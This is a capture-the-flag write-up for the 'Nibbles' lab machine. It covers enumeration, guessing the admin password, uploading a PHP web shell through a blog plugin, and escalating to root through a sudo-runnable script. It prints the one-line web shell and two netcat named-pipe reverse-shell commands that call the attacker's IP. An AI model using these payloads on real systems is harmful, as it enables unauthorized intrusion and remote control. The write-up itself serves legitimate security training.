# Nibbles

Nibbles is an easy machine but it has a login blacklist inclusion so we have to guess the password of an user manually and we can get access into the box in two ways one is to use a metasploit module and one is to manually exploit the vulnerability. In this write-up i’ll exploit the machine manually since it is an easy box.



<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*Gg__semJcHPmV5jnODhjLA.png" alt="" height="290" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:516/1*_txXgUiRzKngWT7_RtPM9g.png" alt="" height="351" width="413"><figcaption></figcaption></figure>

### Nmap <a href="#id-56fa" id="id-56fa"></a>



<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*gAWwT8DXqkGQXePzCYO-Sg.png" alt="" height="310" width="700"><figcaption></figcaption></figure>

We got two open ports 22,80.

#### Enumerating port 80 : <a href="#id-6725" id="id-6725"></a>

Upon visiting the page we got a simple page with a Hello World! in it.

<figure><img src="https://miro.medium.com/v2/resize:fit:669/1*1H5Jk0kVZgHGD3dfvQ13lw.png" alt="" height="378" width="535"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:790/1*SH3meDIKb0VpoYKKR0EEnA.png" alt="" height="426" width="632"><figcaption><p>Source code of the page.</p></figcaption></figure>

Got an Directory /nibbleblog/.

At `/nibbleblog/`, its just an empty blog page ,“Powered by Nibbleblog”:



<figure><img src="https://miro.medium.com/v2/resize:fit:875/0*sbViKmgY11wMa0aM.png" alt="" height="518" width="700"><figcaption></figcaption></figure>

### Finding Directories <a href="#da02" id="da02"></a>

<figure><img src="https://miro.medium.com/v2/resize:fit:766/1*aiYranTnVof5bXWOqKEbEQ.png" alt="" height="653" width="613"><figcaption></figcaption></figure>

Since it is using php i tused some of the common php files as word-list and ran gobuster.



<figure><img src="https://miro.medium.com/v2/resize:fit:1250/1*RjPGbSuj4Ov0U92jqqMtUg.png" alt="" height="581" width="1000"><figcaption></figcaption></figure>

Got some interesting directories admin.php,README,content.

#### /README <a href="#c148" id="c148"></a>



<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*WFgxQ3Pjk1KfbfN8Xgz7qA.png" alt="" height="355" width="700"><figcaption></figcaption></figure>

It reveals the version of the nibbleblog.

#### /content <a href="#d0a8" id="d0a8"></a>

It gives us an username at /private/users.xml.



<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*g3UV2g2ycUvQd2nnDPH9wQ.png" alt="" height="284" width="700"><figcaption></figcaption></figure>

#### **/admin.php : (admin:nibbles)** <a href="#id-973f" id="id-973f"></a>

It’s an login page of the admin.

Since there is an login blacklisting inclusion we need to manually guess the password of the admin. Use the machine name as the password we’ll get access into the admin page. Since it is an easy box try to manually exploit the vulnerability.

**Two ways to exploit**

1. Using metasploit.
2. Manual.

#### 1.Using metasploit <a href="#id-8fd4" id="id-8fd4"></a>

if you want to use metasploit u can use it since we know version,username,password of the admin panel.



<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*8oh1iB2WJNJ_XnuQX6A0SQ.png" alt="" height="483" width="700"><figcaption></figcaption></figure>

It only requires username,password and the application url.

> Note: it’ll only help us to get shell as a user.

#### 2. Manual <a href="#d034" id="d034"></a>



<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*oU60K-qoTSq_e72ntICTOw.png" alt="" height="586" width="700"><figcaption></figcaption></figure>

We can upload files to the application since we are admin.

I used My image plugin to upload the file.

```
<?php passthru($_REQUEST['cmd']); ?>
```

saved this into a file shell.php and uploaded it.

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*LMXvgqLs54xY45yFxiR3gA.png" alt="" height="193" width="700"><figcaption></figcaption></figure>

> Note: we are uploading our own custom file into the my\_image plugin,my\_image helps us to execute commands in the server.

### Getting shell <a href="#id-0271" id="id-0271"></a>

Intercept the request and change to request method to post.



<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*oC8wRJXNyx5h68Xc2vrufQ.png" alt="" height="393" width="700"><figcaption></figcaption></figure>

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 9001 >/tmp/f
```

Used this command to get a reverse shell.



<figure><img src="https://miro.medium.com/v2/resize:fit:1250/1*Hn0nAHU3RhC0nc2S0z7yJA.png" alt="" height="552" width="1000"><figcaption></figcaption></figure>

Got shell.

### **Privilege Escalation** <a href="#id-52dc" id="id-52dc"></a>

Running sudo -l gives the following output.



<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*hk2kWGh_KD1RfY9afxjTkw.png" alt="" height="201" width="700"><figcaption></figcaption></figure>

So the user nibbler can run the monitor.sh as root.



<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*r5iVlqx2bHa429sIxNwRNg.png" alt="" height="28" width="700"><figcaption></figcaption></figure>

So i setup an another listener on my local machine and added this following reverse shell into the monitor.sh file.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 9999 >/tmp/f
```

Then run the file as sudo.

<figure><img src="https://miro.medium.com/v2/resize:fit:710/1*bRTAbL4oEN69Tet9ffeSZw.png" alt="" height="164" width="568"><figcaption></figcaption></figure>

That’s it we’re root now. Happy Hacking ✨.
